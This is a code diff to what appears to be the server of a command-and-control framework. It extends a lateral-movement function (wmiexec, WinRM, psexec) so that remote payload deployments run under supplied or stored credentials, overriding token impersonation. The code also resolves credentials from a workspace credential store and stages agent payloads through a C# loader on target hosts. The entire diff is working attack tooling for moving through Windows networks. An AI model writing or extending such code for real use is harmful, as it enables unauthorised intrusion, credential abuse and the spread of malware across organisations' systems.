@@ -3357,7 +3357,7 @@ class RMMServer:
 
     def lateral_move(self, session_id_or_prefix, method, host, verify=True,
                      exec_timeout=300.0, register_timeout=60.0, verify_timeout=120.0, https=False, insecure=False,
-                     loader="csharp", independent=True):
+                     loader="csharp", independent=True, identity_domain="", identity_user="", identity_password=""):
         """Request remote execution using the source agent's compiled debug mode.
 
         Every method stages the workspace-owned agent build on the server.
@@ -3368,6 +3368,10 @@ class RMMServer:
         right after readiness, and the deployment survives the source like a
         WMI one. independent=False (winrm only) restores the tethered
         lifetime; other methods ignore the option.
+        identity_user forces the deployment's network identity for wmiexec
+        and winrm: the credentials travel to the agent, which passes them
+        explicitly through ConnectServer and the WMI proxy blanket (NTLM) and
+        to the WinRM session, overriding any active make_token.
         """
         session = self.resolve_session(session_id_or_prefix)
         if not session:
@@ -3377,8 +3381,22 @@ class RMMServer:
         debug = getattr(session, "agent_debug", False) is True
         method = (method or "").strip().lower()
         host = (host or "").strip().strip("\\")
+        identity_domain = str(identity_domain or "").strip()
+        identity_user = str(identity_user or "").strip()
         if method not in LATERAL_METHODS:
             return None, "invalid_method"
+        if identity_domain or identity_user or str(identity_password or ""):
+            if method not in ("wmiexec", "winrm"):
+                return None, "invalid_identity_method"
+            if not identity_user:
+                return None, "invalid_identity"
+            if "\\" in identity_user and identity_domain:
+                return None, "invalid_identity"
+            if "\\" in identity_user and not identity_domain:
+                identity_domain, identity_user = identity_user.split("\\", 1)
+                identity_domain, identity_user = identity_domain.strip(), identity_user.strip()
+                if not identity_user:
+                    return None, "invalid_identity"
         if not isinstance(https, bool) or (https and method != "winrm"):
             return None, "invalid_https"
         if not isinstance(insecure, bool) or (insecure and not https):
@@ -3458,8 +3476,11 @@ class RMMServer:
             "stage": stage_id,
             **({"loader": "csharp"} if method != "psexec" else {}),
             **({"payload_sha256": payload_sha256} if method != "psexec" else {}),
-            **({"https": True} if https else {}), **({"insecure": True} if insecure else {})}, separators=(",", ":"))
-        self.record_operator_action(session, f"{LATERAL_COMMAND} {method} {host}" + (" -s" if https else "") + (" -k" if insecure else "") + (f" loader={loader}" if method != "psexec" else "") + (" --tethered" if method == "winrm" and not independent else ""), "lateral")
+            **({"https": True} if https else {}), **({"insecure": True} if insecure else {}),
+            **({"identity": {"domain": identity_domain, "user": identity_user,
+                             "password": str(identity_password or "")}} if identity_user else {})}, separators=(",", ":"))
+        identity_label = (identity_domain + "\\" if identity_domain else "") + identity_user
+        self.record_operator_action(session, f"{LATERAL_COMMAND} {method} {host}" + (" -s" if https else "") + (" -k" if insecure else "") + (f" loader={loader}" if method != "psexec" else "") + (" --tethered" if method == "winrm" and not independent else "") + (f" identity={identity_label}" if identity_user else ""), "lateral")
         event, status = self.exec_and_wait(session.id, command, timeout=exec_timeout)
         if status not in ("ok", "timeout"):
             return None, status
@@ -5687,6 +5708,27 @@ class RMMHandler(BaseHTTPRequestHandler):
                     raise ValueError("independent must be a boolean")
                 if not isinstance(loader, str):
                     raise ValueError("loader must be a string")
+                identity_domain = str(body.get("identity_domain") or "")
+                identity_user = str(body.get("identity_user") or "")
+                identity_password = str(body.get("identity_password") or "")
+                cred_id = str(body.get("identity_cred_id") or "").strip()
+                if cred_id and (identity_domain or identity_user or identity_password):
+                    self._json(400, {"error": "invalid_identity",
+                                     "detail": "Use either identity_cred_id or identity credentials, not both."})
+                    return True
+                if cred_id:
+                    owner = getattr(session, "workspace_id", None) or ""
+                    workspace_dir = plugin_directory(owner)
+                    try:
+                        cred = _rmm_creds.creds_resolve(workspace_dir, cred_id)
+                    except (OSError, ValueError):
+                        self._json(503, {"error": "credential_store_unavailable"})
+                        return True
+                    if cred is None:
+                        self._json(404, {"error": "cred_not_found", "cred_id": cred_id})
+                        return True
+                    identity_domain, identity_user, identity_password = (
+                        cred["domain"], cred["user"], cred["password"])
             except (TypeError, ValueError):
                 self._json(400, {"error": "invalid_lateral_options"})
                 return True
@@ -5700,6 +5742,9 @@ class RMMHandler(BaseHTTPRequestHandler):
                 verify_timeout=verify_timeout,
                 loader=loader,
                 independent=independent,
+                identity_domain=identity_domain,
+                identity_user=identity_user,
+                identity_password=identity_password,
                 **({"https": True} if https else {}),
                 **({"insecure": True} if insecure else {}),
             )
@@ -5708,7 +5753,8 @@ class RMMHandler(BaseHTTPRequestHandler):
             elif status in ("agent_type_unsupported", "session_busy"):
                 self._json(409, {"error": status})
             elif status in ("invalid_method", "invalid_host", "invalid_https",
-                            "invalid_insecure", "invalid_loader", "invalid_independent"):
+                            "invalid_insecure", "invalid_loader", "invalid_independent",
+                            "invalid_identity", "invalid_identity_method"):
                 self._json(400, {"error": status})
             elif status == "loader_reserved":
                 self._json(400, {"error": status,
